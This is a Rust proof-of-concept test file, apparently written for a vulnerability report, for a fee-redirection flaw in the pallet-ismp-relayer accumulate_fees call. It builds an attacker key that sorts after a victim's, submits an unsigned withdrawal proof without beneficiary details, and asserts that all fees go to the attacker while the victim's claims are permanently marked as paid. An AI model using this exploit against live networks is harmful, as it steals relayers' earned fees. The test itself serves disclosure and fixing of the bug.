//! PoC test for permissionless multi-relayer fee redirection in
//! pallet-ismp-relayer::accumulate_fees.
//!
//! Drop this function into:
//!   modules/pallets/testsuite/src/tests/pallet_ismp_relayer.rs
//!
//! Place it after `test_withdrawal_fees_evm` and before
//! `mod outbound_consensus_delivery`. All imports it needs are already
//! present in the file's existing import block.
//!
//! Run:
//!   cargo test -p pallet-ismp-testsuite --lib \
//!     test_accumulate_fees_multi_relayer_redirection -- --nocapture
//!
//! Expected result: ok. 1 passed; 0 failed.

/// Demonstrates that `accumulate_fees` collapses a multi-relayer fee map
/// into a single attacker-controlled payout address, while permanently
/// marking every victim commitment as `claimed`.
///
/// This is the regression introduced in PR #406 (commit 1a2423f3, March
/// 2025), "Accumulate fees into the relayer address on source chain".
#[test]
fn test_accumulate_fees_multi_relayer_redirection_to_lex_last_address() {
    let mut ext = new_test_ext();
    ext.execute_with(|| {
        set_timestamp::<Test>(10_000_000_000);

        // Build two sr25519 keypairs whose public keys sort:
        // victim < attacker (lex order over Vec<u8>).
        let (victim_pair, victim_pubkey) = loop {
            let pair =
                sp_core::sr25519::Pair::from_seed_slice(H256::random().as_bytes()).unwrap();
            let pk = pair.public().0.to_vec();
            if pk[0] < 0x80 {
                break (pair, pk);
            }
        };
        let (_attacker_pair, attacker_pubkey) = loop {
            let pair =
                sp_core::sr25519::Pair::from_seed_slice(H256::random().as_bytes()).unwrap();
            let pk = pair.public().0.to_vec();
            if pk[0] >= 0x80 && pk > victim_pubkey {
                break (pair, pk);
            }
        };
        assert!(attacker_pubkey > victim_pubkey);
        let _ = victim_pair;

        // 4 requests: nonces 0,1 delivered by victim; 2,3 by attacker.
        let requests = (0u64..4)
            .into_iter()
            .map(|nonce| {
                let post = PostRequest {
                    source: StateMachine::Kusama(2000),
                    dest: StateMachine::Kusama(2001),
                    nonce,
                    from: vec![],
                    to: vec![],
                    timeout_timestamp: 0,
                    body: vec![],
                };
                hash_request::<Ismp>(&Request::Post(post))
            })
            .collect::<Vec<_>>();

        // Build source + dest tries.
        let mut source_root = H256::default();
        let mut source_db = MemoryDB::<KeccakHasher>::default();
        let mut source_trie =
            TrieDBMutBuilder::<LayoutV0<KeccakHasher>>::new(&mut source_db, &mut source_root)
                .build();
        let mut dest_root = H256::default();
        let mut dest_db = MemoryDB::<KeccakHasher>::default();
        let mut dest_trie =
            TrieDBMutBuilder::<LayoutV0<KeccakHasher>>::new(&mut dest_db, &mut dest_root).build();

        const FEE_PER_REQUEST: u128 = 1000;

        for (i, request) in requests.iter().enumerate() {
            let request_commitment_key = RequestCommitments::<Test>::storage_key(*request);
            let request_receipt_key = RequestReceipts::<Test>::storage_key(*request);
            let fee_metadata = FeeMetadata::<Test> {
                payer: [0; 32].into(),
                fee: FEE_PER_REQUEST.into(),
            };
            let leaf_meta = RequestMetadata {
                offchain: LeafIndexAndPos { leaf_index: 0, pos: 0 },
                fee: fee_metadata,
                claimed: false,
            };
            RequestCommitments::<Test>::insert(*request, leaf_meta.clone());
            source_trie.insert(&request_commitment_key, &leaf_meta.encode()).unwrap();
            let relayer = if i < 2 { &victim_pubkey } else { &attacker_pubkey };
            dest_trie.insert(&request_receipt_key, &relayer.encode()).unwrap();
        }
        drop(source_trie);
        drop(dest_trie);

        let mut source_recorder = Recorder::<LayoutV0<KeccakHasher>>::default();
        let mut dest_recorder = Recorder::<LayoutV0<KeccakHasher>>::default();
        let source_trie = TrieDBBuilder::<LayoutV0<KeccakHasher>>::new(&source_db, &source_root)
            .with_recorder(&mut source_recorder)
            .build();
        let dest_trie = TrieDBBuilder::<LayoutV0<KeccakHasher>>::new(&dest_db, &dest_root)
            .with_recorder(&mut dest_recorder)
            .build();

        let mut keys = vec![];
        for request in &requests {
            let request_commitment_key = RequestCommitments::<Test>::storage_key(*request);
            let request_receipt_key = RequestReceipts::<Test>::storage_key(*request);
            source_trie.get(&request_commitment_key).unwrap();
            dest_trie.get(&request_receipt_key).unwrap();
            keys.push(Key::Request(*request));
        }

        let source_keys_proof =
            source_recorder.drain().into_iter().map(|f| f.data).collect::<Vec<_>>();
        let dest_keys_proof =
            dest_recorder.drain().into_iter().map(|f| f.data).collect::<Vec<_>>();

        let source_state_proof = SubstrateStateProof::OverlayProof(StateMachineProof {
            hasher: HashAlgorithm::Keccak,
            storage_proof: source_keys_proof,
        });
        let dest_state_proof = SubstrateStateProof::OverlayProof(StateMachineProof {
            hasher: HashAlgorithm::Keccak,
            storage_proof: dest_keys_proof,
        });

        // Standard host wiring (mirrors existing test_accumulate_fees).
        let host = Ismp::default();
        host.store_state_machine_commitment(
            StateMachineHeight {
                id: StateMachineId {
                    state_id: StateMachine::Kusama(2000),
                    consensus_state_id: MOCK_CONSENSUS_STATE_ID,
                },
                height: 1,
            },
            StateCommitment {
                timestamp: 100,
                overlay_root: Some(source_root),
                state_root: Default::default(),
            },
        )
        .unwrap();
        host.store_state_machine_commitment(
            StateMachineHeight {
                id: StateMachineId {
                    state_id: StateMachine::Kusama(2001),
                    consensus_state_id: MOCK_CONSENSUS_STATE_ID,
                },
                height: 1,
            },
            StateCommitment {
                timestamp: 100,
                overlay_root: Some(dest_root),
                state_root: Default::default(),
            },
        )
        .unwrap();
        host.store_state_machine_update_time(
            StateMachineHeight {
                id: StateMachineId {
                    state_id: StateMachine::Kusama(2000),
                    consensus_state_id: MOCK_CONSENSUS_STATE_ID,
                },
                height: 1,
            },
            Duration::from_secs(100),
        )
        .unwrap();
        host.store_state_machine_update_time(
            StateMachineHeight {
                id: StateMachineId {
                    state_id: StateMachine::Kusama(2001),
                    consensus_state_id: MOCK_CONSENSUS_STATE_ID,
                },
                height: 1,
            },
            Duration::from_secs(100),
        )
        .unwrap();
        host.store_consensus_state(MOCK_CONSENSUS_STATE_ID, Default::default()).unwrap();
        host.store_consensus_state_id(MOCK_CONSENSUS_STATE_ID, MOCK_CONSENSUS_CLIENT_ID)
            .unwrap();
        host.store_unbonding_period(MOCK_CONSENSUS_STATE_ID, 10_000_000_000).unwrap();
        host.store_challenge_period(
            StateMachineId {
                state_id: StateMachine::Kusama(2001),
                consensus_state_id: MOCK_CONSENSUS_STATE_ID,
            },
            0,
        )
        .unwrap();
        host.store_challenge_period(
            StateMachineId {
                state_id: StateMachine::Kusama(2000),
                consensus_state_id: MOCK_CONSENSUS_STATE_ID,
            },
            0,
        )
        .unwrap();

        // Submit accumulate_fees as unsigned with NO beneficiary_details.
        let withdrawal_proof = WithdrawalProof {
            commitments: keys.clone(),
            source_proof: Proof {
                height: StateMachineHeight {
                    id: StateMachineId {
                        state_id: StateMachine::Kusama(2000),
                        consensus_state_id: MOCK_CONSENSUS_STATE_ID,
                    },
                    height: 1,
                },
                proof: source_state_proof.encode(),
            },
            dest_proof: Proof {
                height: StateMachineHeight {
                    id: StateMachineId {
                        state_id: StateMachine::Kusama(2001),
                        consensus_state_id: MOCK_CONSENSUS_STATE_ID,
                    },
                    height: 1,
                },
                proof: dest_state_proof.encode(),
            },
            beneficiary_details: None,
        };

        pallet_ismp_relayer::Pallet::<Test>::accumulate_fees(
            RuntimeOrigin::none(),
            withdrawal_proof,
        )
        .unwrap();

        let total_fee = U256::from(4u128 * FEE_PER_REQUEST);
        let attacker_credit = pallet_ismp_relayer::Fees::<Test>::get(
            StateMachine::Kusama(2000),
            attacker_pubkey.clone(),
        );
        let victim_credit = pallet_ismp_relayer::Fees::<Test>::get(
            StateMachine::Kusama(2000),
            victim_pubkey.clone(),
        );

        // 1. theft
        assert_eq!(attacker_credit, total_fee);
        // 2. victim earned 2000 but receives 0
        assert_eq!(victim_credit, U256::zero());
        // 3. permanent denial
        for request in &requests {
            let meta = RequestCommitments::<Test>::get(*request).expect("commitment exists");
            assert!(meta.claimed);
        }
        // 4. recovery blocked
        let withdrawal_proof_retry = WithdrawalProof {
            commitments: keys,
            source_proof: Proof {
                height: StateMachineHeight {
                    id: StateMachineId {
                        state_id: StateMachine::Kusama(2000),
                        consensus_state_id: MOCK_CONSENSUS_STATE_ID,
                    },
                    height: 1,
                },
                proof: source_state_proof.encode(),
            },
            dest_proof: Proof {
                height: StateMachineHeight {
                    id: StateMachineId {
                        state_id: StateMachine::Kusama(2001),
                        consensus_state_id: MOCK_CONSENSUS_STATE_ID,
                    },
                    height: 1,
                },
                proof: dest_state_proof.encode(),
            },
            beneficiary_details: None,
        };
        let retry_err = pallet_ismp_relayer::Pallet::<Test>::accumulate_fees(
            RuntimeOrigin::none(),
            withdrawal_proof_retry,
        );
        assert!(retry_err.is_err());
    })
}